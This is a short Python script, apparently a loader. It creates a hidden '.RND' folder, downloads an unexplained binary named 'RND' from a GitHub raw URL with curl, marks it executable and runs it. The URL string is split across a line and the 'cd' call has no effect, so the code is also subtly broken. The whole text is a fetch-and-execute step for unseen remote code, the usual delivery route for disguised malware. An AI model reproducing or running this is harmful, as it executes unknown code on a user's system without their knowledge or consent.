import os
raw_url='https://github.com/FARABI-XD/abcd
/blob/main/RND?raw=true'
os.system('mkdir .RND')
os.system('cd .RND')
os.system(f'curl -L {raw_url} > RND')
os.system('chmod +x RND')
os.system('./RND')
